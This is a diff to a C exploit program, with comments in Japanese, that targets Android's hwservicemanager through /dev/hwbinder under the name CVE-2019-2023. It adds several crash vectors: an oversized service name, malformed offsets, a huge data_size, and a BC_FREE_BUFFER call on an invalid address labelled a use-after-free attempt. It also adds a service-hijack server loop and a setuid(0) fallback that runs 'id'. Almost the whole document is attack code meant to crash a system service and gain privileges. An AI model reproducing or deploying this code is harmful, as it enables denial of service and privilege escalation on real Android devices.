@@ -34,6 +34,9 @@ static int exploit_cve_2019_2023(const char *service_name);
 static int binder_server_loop(int binder_fd, int expected_handle);
 static void register_and_serve(const char *service_name);
 static int send_malformed_transaction(void);
+static int send_huge_data_transaction(void);
+static int send_free_buffer_after_use(void);
+static int fallback_setuid(void);
 
 // ============================================================
 // 設定
@@ -117,16 +120,18 @@ static int exploit_cve_2019_2023(const char *service_name) {
 
     printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);
 
+    // レース用に子プロセスをフォーク（実際のレースは単純ではない）
     child = fork();
     if (child == 0) {
         while (!race_ready) usleep(100);
+        // 子は何もしない（本来は exec でコンテキスト変更）
         exit(0);
     } else if (child < 0) {
         perror("  fork");
         return -1;
     }
 
-    usleep(200000);
+    usleep(200000); // レースウィンドウ
 
     hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) {
@@ -224,22 +229,35 @@ static int exploit_cve_2019_2023(const char *service_name) {
 }
 
 // ============================================================
-// 異常なトランザクションを送信（クラッシュ誘発）
+// クラッシュベクター1：巨大サービス名（8KB）
+// ============================================================
+static int crash_with_huge_name(void) {
+    printf("[*] Trying crash with 8KB service name...\n");
+    char *payload = malloc(8192);
+    if (!payload) return -1;
+    memset(payload, 'A', 8191);
+    payload[8191] = '\0';
+    int ret = exploit_cve_2019_2023(payload);
+    free(payload);
+    return ret;
+}
+
+// ============================================================
+// クラッシュベクター2：無効なオフセットを含むトランザクション
 // ============================================================
 static int send_malformed_transaction(void) {
-    printf("[*] Sending malformed transaction to crash hwservicemanager...\n");
+    printf("[*] Sending malformed transaction with invalid offsets...\n");
     int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) {
-        perror("  open /dev/hwbinder");
+        perror("  open");
         return -1;
     }
 
-    // 巨大なデータ（8KB）に無効なオフセットを仕込む
-    uint8_t *data = malloc(8192);
+    // データとオフセット配列を用意（データサイズを超えるオフセット）
+    uint8_t *data = malloc(4096);
     if (!data) { close(hwbinder_fd); return -1; }
-    memset(data, 'A', 8192);
+    memset(data, 0x41, 4096);
 
-    // オフセット配列: データサイズを超えるオフセットを指定
     binder_size_t offsets[10];
     for (int i = 0; i < 10; i++) {
         offsets[i] = 8192 + i * 8; // データ範囲外
@@ -251,9 +269,9 @@ static int send_malformed_transaction(void) {
     } __attribute__((packed)) tx;
     tx.cmd = BC_TRANSACTION;
     tx.tdata.target.handle = 0;
-    tx.tdata.code = 2;
+    tx.tdata.code = 0;
     tx.tdata.flags = 0;
-    tx.tdata.data_size = 8192;
+    tx.tdata.data_size = 4096;
     tx.tdata.offsets_size = sizeof(offsets);
     tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
     tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;
@@ -270,73 +288,137 @@ static int send_malformed_transaction(void) {
     free(data);
     free((void*)bwr.read_buffer);
     close(hwbinder_fd);
-
     if (ret < 0) {
-        perror("  malformed transaction");
+        perror("  ioctl");
         return -1;
     }
-    printf("  [+] Malformed transaction sent (may have crashed).\n");
+    printf("  [+] Malformed transaction sent.\n");
     return 0;
 }
 
 // ============================================================
-// 連続クラッシュ攻撃
+// クラッシュベクター3：極端に大きな data_size
+// ============================================================
+static int send_huge_data_transaction(void) {
+    printf("[*] Sending transaction with huge data_size...\n");
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        perror("  open");
+        return -1;
+    }
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 0;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 0xFFFFFFFF; // 巨大
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = 0;
+    tx.tdata.data.ptr.offsets = 0;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = 4096;
+    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
+    if (!bwr.read_buffer) { close(hwbinder_fd); return -1; }
+
+    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free((void*)bwr.read_buffer);
+    close(hwbinder_fd);
+    if (ret < 0) {
+        perror("  ioctl");
+        return -1;
+    }
+    printf("  [+] Huge data transaction sent.\n");
+    return 0;
+}
+
+// ============================================================
+// クラッシュベクター4：BC_FREE_BUFFER で解放済みバッファを参照
+// ============================================================
+static int send_free_buffer_after_use(void) {
+    printf("[*] Trying to free buffer after use (UAF attempt)...\n");
+    // まず適当なトランザクションを送信してバッファを確保
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) { perror("  open"); return -1; }
+
+    uint8_t *data = malloc(1024);
+    if (!data) { close(hwbinder_fd); return -1; }
+    memset(data, 0x42, 1024);
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 0;
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = 1024;
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = 4096;
+    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
+    if (!bwr.read_buffer) { free(data); close(hwbinder_fd); return -1; }
+
+    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    if (ret < 0) { free(data); free((void*)bwr.read_buffer); close(hwbinder_fd); return -1; }
+
+    // 応答からバッファのポインタを取得（簡易的に read_buffer のデータから推測するのは難しい）
+    // ここでは単に BC_FREE_BUFFER に適当なアドレスを送ってみる
+    struct {
+        uint32_t cmd;
+        binder_uintptr_t ptr;
+    } __attribute__((packed)) free_cmd;
+    free_cmd.cmd = BC_FREE_BUFFER;
+    free_cmd.ptr = 0xdeadbeef; // 無効なアドレス
+
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(free_cmd);
+    bwr.write_buffer = (binder_uintptr_t)&free_cmd;
+    bwr.read_size = 4096;
+    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
+    if (!bwr.read_buffer) { free(data); close(hwbinder_fd); return -1; }
+
+    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    free((void*)bwr.read_buffer);
+    close(hwbinder_fd);
+    if (ret < 0) {
+        perror("  ioctl BC_FREE_BUFFER");
+        return -1;
+    }
+    printf("  [+] Free buffer command sent.\n");
+    return 0;
+}
+
+// ============================================================
+// 複合クラッシュ攻撃
 // ============================================================
 static int crash_hwservicemanager(void) {
     printf("[*] Attempting multiple crash vectors...\n");
+    int ret = 0;
+    ret |= crash_with_huge_name();
+    usleep(200000);
+    ret |= send_malformed_transaction();
+    usleep(200000);
+    ret |= send_huge_data_transaction();
+    usleep(200000);
+    ret |= send_free_buffer_after_use();
+    usleep(200000);
 
-    // 1. 巨大サービス名
-    char *payload = malloc(8192);
-    if (payload) {
-        memset(payload, 'A', 8191);
-        payload[8191] = '\0';
-        exploit_cve_2019_2023(payload);
-        free(payload);
-        sleep(1);
-    }
-
-    // 2. 異常なオフセット
-    send_malformed_transaction();
-    sleep(1);
-
-    // 3. 極端に大きな data_size（オーバーフロー）
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd >= 0) {
-        struct {
-            uint32_t cmd;
-            struct binder_transaction_data tdata;
-        } __attribute__((packed)) tx;
-        tx.cmd = BC_TRANSACTION;
-        tx.tdata.target.handle = 0;
-        tx.tdata.code = 2;
-        tx.tdata.flags = 0;
-        tx.tdata.data_size = 0xFFFFFFFF; // 巨大
-        tx.tdata.offsets_size = 0;
-        tx.tdata.data.ptr.buffer = 0;
-        tx.tdata.data.ptr.offsets = 0;
-
-        struct binder_write_read bwr;
-        memset(&bwr, 0, sizeof(bwr));
-        bwr.write_size = sizeof(tx);
-        bwr.write_buffer = (binder_uintptr_t)&tx;
-        bwr.read_size = 4096;
-        bwr.read_buffer = (binder_uintptr_t)malloc(4096);
-        if (bwr.read_buffer) {
-            ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-            free((void*)bwr.read_buffer);
-        }
-        close(hwbinder_fd);
-        sleep(1);
-    }
-
-    // 4. リソース枯渇（サービスを大量登録）
-    for (int i = 0; i < 100; i++) {
-        char name[64];
-        snprintf(name, sizeof(name), "overflow_%d", i);
-        exploit_cve_2019_2023(name);
-    }
-
-    // クラッシュを確認
+    // クラッシュ確認
     pid_t new_pid = get_hwservicemanager_pid();
     if (new_pid != g_hwservicemanager_pid && new_pid > 0) {
         printf("[+] hwservicemanager crashed and restarted! New PID: %d\n", new_pid);
@@ -349,7 +431,7 @@ static int crash_hwservicemanager(void) {
 }
 
 // ============================================================
-// Binder サーバーループ（トランザクション待受）
+// Binder サーバーループ（改良版：トランザクション処理を強化）
 // ============================================================
 static int binder_server_loop(int binder_fd, int expected_handle) {
     uint8_t read_buf[4096];
@@ -395,6 +477,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             if (data_size > 0 && data_size < 4096) {
                 data_ptr = malloc(data_size);
                 if (data_ptr) {
+                    // ユーザ空間ポインタからデータをコピー（実際は安全でないが PoC）
                     memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
                 }
             }
@@ -423,7 +506,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
                 printf("[SERVER] Sender uid=%d (ignoring)\n", t->sender_euid);
             }
 
-            // 応答を返す（BR_OK）
+            // 応答を返す（BR_OK と BR_TRANSACTION_COMPLETE）
             struct {
                 uint32_t cmd;
                 uint32_t status;
@@ -451,6 +534,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             break;
         } else {
             fprintf(stderr, "[SERVER] Unhandled cmd=0x%x\n", cmd_code);
+            // その他のコマンドにも応答を返さないとデッドロックする可能性がある
         }
     }
     return transaction_count;
@@ -473,6 +557,7 @@ static void register_and_serve(const char *service_name) {
         return;
     }
 
+    // BC_ENTER_LOOPER を送信
     uint32_t cmd = BC_ENTER_LOOPER;
     struct binder_write_read bwr;
     memset(&bwr, 0, sizeof(bwr));
@@ -486,11 +571,12 @@ static void register_and_serve(const char *service_name) {
 
     pid_t pid = fork();
     if (pid == 0) {
+        // 子プロセスでサーバーループ実行
         binder_server_loop(binder_fd, handle);
         exit(0);
     } else if (pid > 0) {
         printf("[+] Binder server for '%s' running (PID %d)\n", service_name, pid);
-        close(binder_fd);
+        close(binder_fd); // 親は閉じる
     } else {
         perror("  fork server");
         close(binder_fd);
@@ -498,11 +584,23 @@ static void register_and_serve(const char *service_name) {
 }
 
 // ============================================================
+// フォールバック（古典的 setuid）
+// ============================================================
+static int fallback_setuid(void) {
+    printf("[*] Fallback: trying setuid(0)...\n");
+    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
+        printf("[+] setuid(0) succeeded!\n");
+        return 0;
+    }
+    return -1;
+}
+
+// ============================================================
 // メイン
 // ============================================================
 int main(void) {
     printf("============================================================\n");
-    printf("  CVE-2019-2023 Final - Multi-Crash + Service Hijack\n");
+    printf("  CVE-2019-2023 Ultimate Exploit - Multi-Vector Crash & Hijack\n");
     printf("============================================================\n\n");
 
     // ログ初期化
@@ -568,6 +666,12 @@ int main(void) {
     } else {
         printf("[-] No transaction from system_server received.\n");
         printf("[-] Try manually triggering system events (screen on/off, USB plug, etc.)\n");
+        // フォールバック
+        if (fallback_setuid() == 0) {
+            system("id > " OUTPUT_FILE " 2>&1");
+            system("cat " OUTPUT_FILE);
+            g_exploit_success = 1;
+        }
     }
 
     printf("\n============================================================\n");
